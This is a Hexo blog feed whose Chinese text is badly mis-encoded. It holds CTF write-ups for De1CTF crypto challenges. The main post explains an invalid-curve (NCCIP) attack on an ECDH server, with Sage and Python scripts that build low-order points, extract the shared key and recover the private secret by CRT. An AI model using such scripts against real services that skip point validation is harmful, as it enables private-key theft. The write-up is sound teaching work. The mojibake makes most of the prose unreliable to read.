æ¢ä¸€æ¢alphaçš„å€¼ï¼Œç”¨è§£å‡ºæ¥çš„phiæ±‚è§£ç§é’¥ï¼Œè§£å¯†å¯†æ–‡ï¼Œè§‚å¯Ÿè§£å¯†åçš„æ˜æ–‡æ˜¯å¦ä¸ºflagå°±å¥½</p><p><del>é¢˜åšå‡ºæ¥äº†ï¼Œä½†å…¶å®åŸç†å¹¶æ²¡æœ‰æ‡‚ï¼Œæ˜¯ä¸€ä¸ªå¤§å‘ï¼Œç­‰ä¿ºå“ªå¤©å­¦ä¼šäº†å†è¯´å“ˆå“ˆå“ˆå“ˆå“ˆ</del></p><h3 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a>ECDH</h3><p>NCCIPé—®é¢˜ï¼Œç›´æ¥æ„é€ å‡ºä½é˜¶ç‚¹Pï¼ˆè®°å½•Pçš„é˜¶ä¸ºNï¼‰ï¼Œç„¶åå‘é€ç»™æœåŠ¡ç«¯ï¼Œè®©ä»–ç®—å‡ºkeyï¼Œä¹‹ååŠ å¯†è‡ªå·±çš„è¾“å…¥ï¼Œæˆ‘ä»¬æ‹¿æ¥å¼‚æˆ–è‡ªå·±çš„è¾“å…¥ä»è€Œå¾—åˆ°keyï¼Œç„¶åæ ¹æ®keyçš„å€¼ï¼ˆå’ŒPçš„å…³ç³»ï¼‰å¯ä»¥å¾—åˆ°secretæ¨¡Nçš„ä¸€ä¸ªå‰©ä½™ï¼Œå³secret%Nï¼Œå¤šå‘é€å‡ ä¸ªï¼Œæœ€åæ¥ä¸€æ³¢CRTå°±å¥½ã€‚</p><p>å…·ä½“æ­¥éª¤ã€ç»†èŠ‚ä¿ºä¼šä¸“é—¨å†å†™ä¸€ç¯‡ã€‚  <del>åœ¨åšäº†ï¼Œåœ¨åšäº†</del></p><h3 id="Homomorphic"><a href="#Homomorphic" class="headerlink" title="Homomorphic"></a>Homomorphic</h3><p><del>è¿™é“é¢˜ä¿ºå…¶å®è¿è§£å¯†åŸç†éƒ½æ²¡ææ‡‚ï¼Œè‡ªå·±å¯¹å¤šé¡¹å¼è¿˜æ˜¯ä¸å¤Ÿäº†è§£ç†Ÿæ‚‰ï¼Œæ‰€ä»¥è¿™é¢˜å°±æœ¬åœ°æ­å¥½ï¼Œç„¶åæµ‹ï¼å°±ç¡¬æµ‹ï¼</del></p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¯¥ç®—æ³•å¦‚å…¶åï¼Œå…·æœ‰åŠ æ³•åŒæ€ã€‚å¹¶ä¸”å‘é€(1,1,1,1,,,,,,1)å’Œ(1,1,1,,,,,1)è¿‡å»è§£å¯†å¾—åˆ°çš„æ˜æ–‡çš„asciiå€¼æ˜¯0ã€‚</p><p>æ‰€ä»¥ç›´æ¥æŠŠæœåŠ¡ç«¯ç»™çš„flagçš„æ‰€æœ‰å¯†æ–‡(FLAG)ï¼ˆ44å¯¹ï¼Œ88ç»„å¤šé¡¹å¼ï¼‰ï¼Œæ¯ä¸€å¯¹ä¸­æ¯ä¸€ç»„çš„æ¯ä¸€ä¸ªç³»æ•°éƒ½å‡1ï¼Œå‘é€å›å»ç»™æœåŠ¡ç«¯è§£å¯†å°±å¥½ã€‚ç„¶åindexè¾“å…¥0ï¼ˆå¤šé¡¹å¼çš„è¡¨è¾¾ï¼Œåˆ—è¡¨é‡Œå¤´å¥½åƒç¬¬ä¸€ä¸ªæ˜¯å¸¸æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦çš„mï¼‰ï¼Œå¾—åˆ°ä¸€ä½flagçš„asciiç ï¼Œ44æ¬¡äº¤äº’å¾—åˆ°flagã€‚</p><p><del>æ²¡æ‡‚åŸç†ï¼Œæµ‹è¯•å‡ºæ¥çš„è€Œå·²å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</del></p><p>æ„Ÿè§‰è¿™æ˜¯éé¢„æœŸï¼Œæ¯•ç«Ÿè®©æˆ‘ä»¬äº¤äº’2^10æ¬¡ï¼Œå‡ºé¢˜äººåº”è¯¥æ˜¯çœ‹äº†è¿™ç¯‡<a href="https://arxiv.org/pdf/1906.07127.pdf" target="_blank" rel="noopener">paper</a>ï¼Œæƒ³è®©æˆ‘ä»¬æ¢å¤ç§é’¥çš„å§å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆã€‚<del>ä¿ºä»¥åæœ‰ç©ºä¸€å®šçœ‹ï¼Œä¸€å®šçœ‹</del>    ã€</p><p>PSï¼šbadmonkeyå¸ˆå‚…å¥½åƒæ˜¯æ ¹æ®è¿™ä¸ªæ¥çš„ï¼Œæ¢å¤äº†ç§é’¥ï¼ŒTQL!!!</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ NCCIP</title>
      <link href="/2020/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BNCCIP/"/>
      <url>/2020/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BNCCIP/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äº<a href="https://www.anquanke.com/post/id/204397" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="De1CTF-ECDH"><a href="#De1CTF-ECDH" class="headerlink" title="De1CTF  - ECDH"></a>De1CTF  - ECDH</h2><p><a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/NCCIP/ECDH.zip" target="_blank" rel="noopener">èµ›é¢˜é™„ä»¶</a>åœ¨è¿™é‡Œï¼Œç„¶åå®¡è®¡ä»£ç ä¹‹åï¼Œå¯ä»¥æŠŠè¿™ä¸ªé—®é¢˜æ¦‚æ‹¬ä¸ºï¼š</p><ol><li>é¢˜ç›®ç”¨çš„æ˜¯æ ‡å‡†æ›²çº¿ï¼š$y^2 \equiv x^3 +ax + b \pmod{p}$ï¼Œå¹¶æä¾›a,b,p</li><li>å‡½æ•° Exchangeï¼šECDHé—®é¢˜ï¼Œç”Ÿæˆå…±äº«å¯†é’¥æ—¶ä½ æä¾›ä¸€ä¸ªç‚¹Pï¼Œä»–ä¼šç”¨è‡ªå·±çš„ç§é’¥ï¼Œsecret*Pç”Ÿæˆåå•†å¯†é’¥key</li><li>å‡½æ•° Encryptï¼šç”¨keyåŠ å¯†ä½ çš„è¾“å…¥ï¼ŒåŠ å¯†æ–¹å¼ä¸ºå°†keyçš„xå’Œyæ‹¼æ¥åäºè¾“å…¥ç®€å•å¼‚æˆ–</li><li>å‡½æ•° Backdoorï¼šè¾“å…¥æœåŠ¡ç«¯secretå€¼ï¼Œè¿”å›flag</li></ol><p>æ•´ä½“æµç¨‹ç®—æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ECDHï¼Œä½†åœ¨æ ‡å‡†çš„ECDHä¸­ï¼Œä¸€æ–¹åº”è¯¥æ˜¯æ— æ³•è®¡ç®—å‡ºå¦ä¸€æ–¹çš„ç§é’¥çš„ï¼Œå¦åˆ™è¿™ä¸ªç®—æ³•å°±GGäº†ã€‚è€Œè¿™ä¸€é¢˜çš„æ¼æ´å°±åœ¨äºï¼Œåœ¨å¯†é’¥äº¤æ¢çš„è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡ç«¯å¹¶æ²¡æœ‰æ£€æŸ¥ä½ æä¾›çš„ç‚¹æ˜¯å¦åœ¨è§„å®šå¥½çš„æ›²çº¿ä¸Šã€‚æ‰€ä»¥è¿™é‡Œçš„æ”»å‡»æ–¹å¼å°±æ˜¯â€No Correctness Check for Input Pointsâ€ (NCCIP) attacksã€‚</p><p>ç”±æœ‰é™åŸŸä¸Šæ¤­åœ†æ›²çº¿ä¸Šæ•´æ•°ç‚¹çš„åŠ æ³•è®¡ç®—å¼ï¼š</p><p>è®¾ï¼šå·²çŸ¥æ›²çº¿ $y^2 \equiv x^3 +ax + b \pmod{p}$ å’Œ P(x1,y1) å’Œ Q(x2,y2) ï¼Œæˆ‘ä»¬è®¡ç®—R(x3,y3) = P + Q </p><p>x3 â‰¡ k2-x1 - x2 (mod p)</p><p>y3 â‰¡ k(x1-x3) - y1 (mod p)</p><p>è‹¥P = Q åˆ™ k = (3*x2+a)/(2y1) mod p</p><p>è‹¥P â‰  Qï¼Œåˆ™k = (y2-y1)/(x2-x1) mod p</p><p>æ›²çº¿çš„é˜¶ä¸bå€¼æœ‰å…³ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œåœ¨æ•´ä¸ªåŠ æ³•ã€ä¹˜æ³•ï¼ˆä»åŠ æ³•å¼•ç”³åˆ°ä¹˜æ³•æ˜¯ä¸€ä»¶æå…¶è‡ªç„¶çš„äº‹ï¼‰è®¡ç®—çš„è¿‡ç¨‹ä¸­ï¼Œç‚¹Rå´ä¸æ›²çº¿çš„bå€¼æ— å…³ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ›´æ”¹bçš„å€¼ï¼Œç”Ÿæˆä¸€æ¡æ–°çš„æ›²çº¿ï¼Œä¸”è¿™ä¸ªæ›²çº¿çš„é˜¶æœ‰ä¸€ä¸ªå¾ˆå°çš„å› å­ï¼Œæ¯”å¦‚åªæœ‰7ï¼Œé‚£ä¹ˆè¿™ä¸ªæ›²çº¿ä¸Šä¸€å®šä¼šæœ‰é˜¶ä¸º7çš„ç‚¹ã€‚å¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªç‚¹ä¼ ç»™æœåŠ¡ç«¯ã€‚è€ŒæœåŠ¡ç«¯æ²¡æœ‰æ£€æŸ¥æˆ‘ä»¬è¿™ä¸ªç‚¹çš„åˆæ³•æ€§ï¼Œç›´æ¥æ‹¿æ¥è®¡ç®—ç”Ÿæˆkeyï¼Œä¼šäº§ç”Ÿæ€ä¹ˆæ ·çš„åæœå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å‡è®¾ç‚¹Pçš„é˜¶ä¸º7ï¼Œå³ 7*P = Oâˆï¼Œå†è®¾secretå€¼ä¸º31</p><p>é‚£ä¹ˆæœåŠ¡ç«¯å°±ä¼šè®¡ç®—31*P  â‰¡ 3P</p><p>ç”±äºé˜¶å¾ˆå°ï¼Œæˆ‘ä»¬å¯ä»¥éå†å¾—åˆ° key = 3Pï¼Œç­‰ä»·äºï¼Œæˆ‘ä»¬çŸ¥é“äº†secret % 7 = 3</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦å¤šæ‰¾è¿™ä¹ˆå‡ ä¸ªä½é˜¶ç‚¹ï¼Œå¤šå¾—åˆ°å‡ æ¡è¿™æ ·çš„åŒä½™å¼ï¼Œæœ€ååˆ©ç”¨CRTå°±å¯ä»¥æ¢å¤secretäº†ã€‚</p><p>ã€å‘ƒï¼Œå†ç®€è¦è¯´æ˜ä¸€ä¸‹æˆ‘ä»¬çš„æ“ä½œå­ï¼Œæˆ‘ä»¬æ›´æ”¹äº†bçš„å€¼ï¼Œé€ äº†ä¸€æ¡æ–°çš„æ›²çº¿ï¼Œå¹¶ä¸”åœ¨ä¸Šé¢æ‰¾äº†ä¸€ä¸ªä½é˜¶ç‚¹ã€‚è€Œè¿™ä¸ªç‚¹æ‹¿å»æœåŠ¡ç«¯è¿ç®—ï¼Œè¿ç®—åªéœ€è¦è¿™ä¸ªç‚¹çš„xåæ ‡ï¼Œyåæ ‡å’Œæ›²çº¿çš„aå€¼ï¼Œæ‰€ä»¥å¯ä»¥ç†è§£ä¸ºï¼Œå› ä¸ºæœåŠ¡ç«¯æ²¡æœ‰æ£€æŸ¥è¾“å…¥ç‚¹çš„åˆæ³•æ€§ï¼Œå¯¼è‡´ï¼ŒæœåŠ¡ç«¯ç”¨çš„æ›²çº¿è¢«æˆ‘ä»¬çªœæ”¹äº†ã€‚ã€‘</p><h3 id="step1-æ‰¾åˆ°æœ‰ä½é˜¶ç‚¹çš„æ›²çº¿"><a href="#step1-æ‰¾åˆ°æœ‰ä½é˜¶ç‚¹çš„æ›²çº¿" class="headerlink" title="step1-æ‰¾åˆ°æœ‰ä½é˜¶ç‚¹çš„æ›²çº¿"></a>step1-æ‰¾åˆ°æœ‰ä½é˜¶ç‚¹çš„æ›²çº¿</h3><p>â€‹        æˆ‘ä»¬è¦æ‰¾åˆ°ä½é˜¶ç‚¹ï¼Œæˆ‘ä»¬å°±å…ˆè¦æ‰¾åˆ°ä¸€æ¡é˜¶æœ‰å°å› å­çš„æ›²çº¿ã€‚</p><p>â€‹        ç”±äºsympyåˆ†è§£å¤§æ•°é€Ÿåº¦ä¼¼ä¹æœ‰ç‚¹æ…¢ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥æ›´æ”¹bçš„å€¼ï¼Œç”Ÿæˆä¸€æ¡æ–°çš„æ›²çº¿ï¼Œç„¶åè®¡ç®—ã€å†å»<a href="http://www.factordb.com/" target="_blank" rel="noopener">åœ¨çº¿å¹³å°</a>åˆ†è§£è¿™æ¡æ›²çº¿çš„é˜¶ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å°å› å­ã€‚</p><p>â€‹        æœ‰ä¸€æ¡æ›²çº¿ï¼Œä½†æ˜¯ä¸Šé¢çš„ç”Ÿæˆå…ƒç‚¹æ€ä¹ˆæ‰¾å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬æ”¹ä¸€æ”¹ï¼Œå…ˆç¡®å®šä¸€ä¸ªç‚¹ï¼Œç„¶åå†å»ç¡®å®šbå€¼ä»è€Œç¡®å®šæ›²çº¿ï¼Œç„¶åå»è®¡ç®—ã€åˆ†è§£è¿™ä¸ªç‚¹çš„é˜¶ã€‚</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = 0xb55c08d92cd878a3ad444a3627a52764f5a402f4a86ef700271cb17edfa739ca</span><br><span class="line">y = 20</span><br><span class="line">q = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd</span><br><span class="line">a = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa</span><br><span class="line"></span><br><span class="line">for _ in range(60):</span><br><span class="line">    y+=1</span><br><span class="line">    b = (y**2 - x**3- a*x)%q</span><br><span class="line">    ecc = EllipticCurve(GF(q), [a,b])</span><br><span class="line">    G = ecc(x,y)</span><br><span class="line">    print(y)</span><br><span class="line">    print(G.order())</span><br></pre></td></tr></table></figure><h3 id="step2-æ‰¾åˆ°ä½é˜¶ç‚¹"><a href="#step2-æ‰¾åˆ°ä½é˜¶ç‚¹" class="headerlink" title="step2-æ‰¾åˆ°ä½é˜¶ç‚¹"></a>step2-æ‰¾åˆ°ä½é˜¶ç‚¹</h3><p>æœ‰ä¸€æ¡é˜¶æœ‰å°å› å­çš„çº¿äº†ï¼Œæœ‰ä¸Šé¢çš„ä¸€ä¸ªç‚¹Gï¼Œä¸”çŸ¥é“å®ƒçš„é˜¶äº†ï¼Œä½é˜¶ç‚¹æ€ä¹ˆæ‰¾å‘¢ï¼Ÿ</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆç®€å•çš„é“ç†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œ77ï¼Œå¯ä»¥ç­‰äº7ä¹˜ä»¥11ï¼Œä¹Ÿå¯ä»¥ç­‰äº11ä¹˜ä»¥7ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¿™ä¸ªç‚¹Gçš„é˜¶æ˜¯77ï¼Œé‚£ä¹ˆï¼Œ7*Pçš„é˜¶å°±æ˜¯11ï¼Œ11*Pçš„é˜¶å°±æ˜¯7äº†ã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„è„šæœ¬å¾—åˆ°ä¸€ä¸ªé˜¶ä¸º$2 * 3 * 5^2  *  83 * 13313 * 45413 *6654245328558174325218919079449691616264872121315671061356825923$çš„ç‚¹Gï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°é˜¶åˆ†åˆ«ä¸º2ï¼Œ3ï¼Œ5ï¼Œ83ï¼Œ13313çš„ç‚¹ï¼ˆåé¢çš„å°±ä¸è¦äº†ï¼Œé˜¶å¤ªå¤§ï¼Œä¹‹åéå†è€—æ—¶ä¹Ÿå¤ªé•¿äº†ï¼Œå¤§æ¦‚ä¸€ä¸‡å·¦å³çš„æ˜¯æˆ‘ä»¬å¯ä»¥æ¥å—çš„ã€‚ï¼‰</p><p>ä¸‹é¢çš„è„šæœ¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªé˜¶ä¸º83çš„ç‚¹P</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = 0xb55c08d92cd878a3ad444a3627a52764f5a402f4a86ef700271cb17edfa739ca</span><br><span class="line">q = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd</span><br><span class="line">a = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa</span><br><span class="line">y = 314</span><br><span class="line"></span><br><span class="line">b = (y^2 - x^3- a*x)%q</span><br><span class="line">ecc = EllipticCurve(GF(q), [a,b])</span><br><span class="line">G = ecc(x,y)</span><br><span class="line">print(G  * 2 * 3 * 5^2  * 13313 * 45413 *6654245328558174325218919079449691616264872121315671061356825923)</span><br></pre></td></tr></table></figure><h3 id="step3-è®¡ç®—åå•†å¯†é’¥"><a href="#step3-è®¡ç®—åå•†å¯†é’¥" class="headerlink" title="step3-è®¡ç®—åå•†å¯†é’¥"></a>step3-è®¡ç®—åå•†å¯†é’¥</h3><p>æˆ‘ä»¬å°†è¿™ä¸ªç‚¹På½“åšæˆ‘ä»¬çš„å…¬é’¥ä¼ ç»™æœåŠ¡ç«¯ï¼Œä»–ä¼šç”¨secret*P è®¡ç®—åå•†å¯†é’¥key</p><p>éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œç”±äºæˆ‘ä»¬ç ´åäº†è§„åˆ™ï¼Œå¯¼è‡´æœåŠ¡ç«¯çš„å…¬é’¥å·²ç»ä¸èƒ½ç”¨äº†ï¼Œå†µä¸”ï¼Œå…¶å®æˆ‘ä»¬è‡ªå·±ä¹Ÿä¸çŸ¥é“è‡ªå·±çš„ç§é’¥æ˜¯å•¥ã€‚æ‰€ä»¥è¿™ä¸ªåå•†å¯†é’¥æˆ‘ä»¬è¿˜å¾—åˆ©ç”¨åŠ å¯†å‡½æ•°æ¥è·å–ã€‚</p><p>å…·ä½“æ“ä½œè§ä¸‹é¢äº¤äº’è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">"choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"Encrypt"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"hex):\n"</span>)</span><br><span class="line">mess = <span class="string">"a"</span>*<span class="number">512</span></span><br><span class="line">sh.sendline(mess)</span><br><span class="line">sh.recvuntil(<span class="string">"The result is:\n"</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">key = int(mess,<span class="number">16</span>)^int(res,<span class="number">16</span>)</span><br><span class="line">x , y = key &gt;&gt; q.bit_length() , key &amp; ((<span class="number">1</span> &lt;&lt; q.bit_length()) - <span class="number">1</span>)</span><br><span class="line">G = (x,y)</span><br></pre></td></tr></table></figure><p>ç”±äºqæ˜¯256ä½çš„ï¼Œæ‰€ä»¥keyæ˜¯512ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ ä¸ª512ä½çš„æ˜æ–‡è¿‡å»ã€‚ç„¶åå¼‚æˆ–å›æ¥ï¼Œåˆ†ç¦»ä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°secret*Pè¿™ä¸ªç‚¹äº†ã€‚</p><h3 id="step4-è®¡ç®—secretçš„ä¸€ä¸ªå‰©ä½™"><a href="#step4-è®¡ç®—secretçš„ä¸€ä¸ªå‰©ä½™" class="headerlink" title="step4-è®¡ç®—secretçš„ä¸€ä¸ªå‰©ä½™"></a>step4-è®¡ç®—secretçš„ä¸€ä¸ªå‰©ä½™</h3><p>çŸ¥é“keyäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥éå†è®¡ç®—secretå…³äºè¿™ä¸ªä½é˜¶çš„å‰©ä½™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">G = (x,y)<span class="comment">#key</span></span><br><span class="line">Q = (int(each[<span class="number">0</span>]),int(each[<span class="number">1</span>]))<span class="comment">#æˆ‘ä»¬æ‰¾åˆ°çš„ä½é˜¶ç‚¹Q</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(each[<span class="number">2</span>])):</span><br><span class="line"><span class="keyword">if</span> mul(i,Q) == G:</span><br><span class="line">reslist.append(i)<span class="comment">#secretçš„å‰©ä½™</span></span><br><span class="line">N.append(int(each[<span class="number">2</span>]));<span class="keyword">print</span> (i,int(each[<span class="number">2</span>])) <span class="comment">#secretçš„å‰©ä½™å¯¹åº”çš„é˜¶</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="step5-åˆ©ç”¨CRTè®¡ç®—secret"><a href="#step5-åˆ©ç”¨CRTè®¡ç®—secret" class="headerlink" title="step5-åˆ©ç”¨CRTè®¡ç®—secret"></a>step5-åˆ©ç”¨CRTè®¡ç®—secret</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * inverse(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line">secret = CRT(N, reslist)</span><br></pre></td></tr></table></figure><p>å®Œæ•´expæ”¾åœ¨<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/NCCIP/ECDH-exp.zip" target="_blank" rel="noopener">è¿™é‡Œ</a>äº†ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¸ªäººè®¤ä¸ºï¼ŒNCCIPé—®é¢˜ä¸»è¦è¿˜æ˜¯å› ä¸ºæœåŠ¡ç«¯çš„æ›²çº¿è¢«çªœæ”¹ä¸ºé˜¶æœ‰å°å› å­çš„ä¸å®‰å…¨çš„æ›²çº¿ï¼Œä»è€Œé€ æˆäº†ç§é’¥éƒ¨åˆ†ä¿¡æ¯çš„æ³„éœ²ã€‚é€šè¿‡è¿™ä¸ªé—®é¢˜ï¼Œè‡ªå·±å¯¹ECCä¹Ÿæœ‰äº†æ›´è¿›ä¸€æ­¥çš„è®¤è¯†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> ECC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Van1sh çš„ å¾…åŠäº‹é¡¹</title>
      <link href="/2020/05/03/%E5%BE%85%E5%8A%9E%E4%BA%8B%E9%A1%B9/"/>
      <url>/2020/05/03/%E5%BE%85%E5%8A%9E%E4%BA%8B%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="æƒ³äº†æƒ³è¿˜æ˜¯ä¸å…¬å¼€äº†å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ" />    <label for="hbePass">æƒ³äº†æƒ³è¿˜æ˜¯ä¸å…¬å¼€äº†å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="775aca880035b0c28b1c362e66e84c0c7a087ee6b57f47814045658e701ac726">ea2c10504d614b0eeea5881f2d0b06e63cf56cf195b78a7b6b88f6690edc285ed549eacfa6e59f0c85d3f771ada565380a02193adc7bfcf1ac79d5ad749e3d09154f07ebdccbf24c24b11d87dd83b878ea7610c214e0577c886d91a748b6ef0f3dd5ff1360a558c2fba15cb0c3be53b59581783927ce17425e4400c4d90212f1a626b828f6ac6cb21672860ecaeab8fab90432f5182755bc100ee5f565f266c6fd2d3507a006013fbfd97ce50952c2f7aa7bfe3e0c651e4ebd7c3a9c61d0331ec2ae11fb2ab27a42ca0eb6e6f7db72275204687d6e9b313bc6d5409461e1af26429978bb4ce16090207e5c13f9217dcb88f9b386128139627efaff0ebf2c81e4</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ åˆ†ç»„å¯†ç æ“ä½œæ¨¡å¼</title>
      <link href="/2020/03/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
      <url>/2020/03/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://mp.weixin.qq.com/s/DlKBJEc8mjTBS9QePaUE0w" target="_blank" rel="noopener">åˆå¤©æ™ºæ±‡</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp;æœ€è¿‘åœ¨åˆ†ç»„å¯†ç å­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œäº†è§£äº†AESåˆ†ç»„å¯†ç ä»¥åŠåˆ†ç»„å¯†ç çš„äº”ç§æ“ä½œæ¨¡å¼ã€‚ç›®å‰å·²çŸ¥çš„å¯¹AESçš„åˆ†ææ”»å‡»éƒ½æ¯”è›®åŠ›æ”»å‡»çš„å¤æ‚åº¦è¦é«˜ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è·³è¿‡AESåŠ å¯†æœ¬èº«ï¼Œçœ‹çœ‹è¿™äº”ç§æ“ä½œæ¨¡å¼çš„åŸç†ä»¥åŠæ˜¯å¦ä¼šå› ä¸ºä¸€äº›æ“ä½œä¸å½“è€Œäº§ç”Ÿå¼±ç‚¹ã€‚</p><h3 id="æ“ä½œæ¨¡å¼"><a href="#æ“ä½œæ¨¡å¼" class="headerlink" title="æ“ä½œæ¨¡å¼"></a>æ“ä½œæ¨¡å¼</h3><p>&emsp;&emsp;åˆ†ç»„å¯†ç ä¸ä»…ä»…æ˜¯ä¸€ä¸ªåŠ å¯†ç®—æ³•ï¼Œä¹Ÿæ˜¯ç”¨äºå®ç°å¤šç§ä¸åŒå¯†ç å­¦ç¼–ç æœºåˆ¶çš„ä¸‡èƒ½å…ƒä»¶ã€‚ä¾‹å¦‚ï¼Œäººä»¬å¯ä»¥ä½¿ç”¨åˆ†ç»„å¯†ç æ„å»ºå„ç§ä¸åŒç§ç±»çš„åŸºäºåˆ†ç»„çš„åŠ å¯†æ–¹æ¡ˆï¼Œç”šè‡³è¿˜å¯ä»¥ç”¨å®ƒæ¥å®ç°åºåˆ—å¯†ç ã€‚å…¶ä¸­ï¼Œä¸åŒçš„åŠ å¯†æ–¹å¼å°±ç§°ä¸ºæ“ä½œæ¨¡å¼ã€‚ç›®å‰åŒ…æ‹¬äº”ç§ä¸»æµçš„æ“ä½œæ¨¡å¼ï¼š</p><p>ç”µå­å¯†ç æœ¬æ¨¡å¼(electronic code book mode, 